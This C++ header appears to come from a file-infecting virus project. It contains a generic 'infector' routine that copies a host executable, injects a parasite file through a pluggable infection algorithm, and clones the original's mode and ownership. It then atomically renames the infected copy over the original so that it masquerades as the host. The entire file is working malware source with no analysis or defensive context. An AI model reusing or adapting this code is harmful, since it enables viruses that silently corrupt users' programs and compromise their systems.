#pragma once
#include <linux/limits.h>
#include <stdlib.h>
#include "common/file_descriptor.hh"
#include "common/mmap.hh"
#include "nostdlib/stdio.hh"
#include "nostdlib/string.hh"

namespace vt::infector {
// A generic infection routine, that can be used by any algorithms.
// It creates a temp copy of the host, infects it with a parasite, and then
// pretend to be the host with atomic rename.
template <typename Infect>
bool infect(const char* host_path, const char* parasite_path) {
  common::FileDescriptor host(host_path, O_RDONLY);
  if (!host.valid()) {
    return false;
  }
  auto host_size = host.file_size();
  common::Mmap<PROT_READ> host_mapping(host_size, MAP_SHARED, host.handle(), 0);

  common::FileDescriptor parasite(parasite_path, O_RDONLY);

  if (!parasite.valid()) {
    return false;
  }
  common::Mmap<PROT_READ> parasite_mapping(parasite.file_size(), MAP_SHARED,
                                           parasite.handle(), 0);

  char tmp[PATH_MAX];
  auto len = strlen(host_path);
  vt::strcpy(tmp, host_path);
  tmp[len] = '.';
  tmp[len + 1] = '\0';

  common::FileDescriptor output(tmp, O_RDWR | O_CREAT, S_IRWXU);

  if (!output.valid()) {
    return false;
  }
  auto output_size = Infect::output_size(host_size, parasite_mapping.size());
  vt::ftruncate(output.handle(), output_size);

  common::Mmap<PROT_READ | PROT_WRITE> output_host_mapping(
      output_size, MAP_SHARED, output.handle(), 0);

  // Make a writable copy of the host.
  vt::memcpy(output_host_mapping.mutable_base(), host_mapping.base(),
             host_mapping.size());

  Infect infector;
  if (!infector(vt::move(output_host_mapping), vt::move(parasite_mapping))) {
    return false;
  }

  // mimic the original file.
  struct stat s;
  if (vt::fstat(host.handle(), &s) < 0) {
    return false;
  }
  if (vt::fchmod(output.handle(), s.st_mode) < 0) {
    return false;
  }
  if (vt::fchown(output.handle(), s.st_uid, s.st_gid) < 0) {
    return false;
  }
  // atomic swap and replace the orignal host with our infected one.
  if (vt::rename(tmp, host_path) < 0) {
    return false;
  }
  return true;
}
}  // namespace vt::infector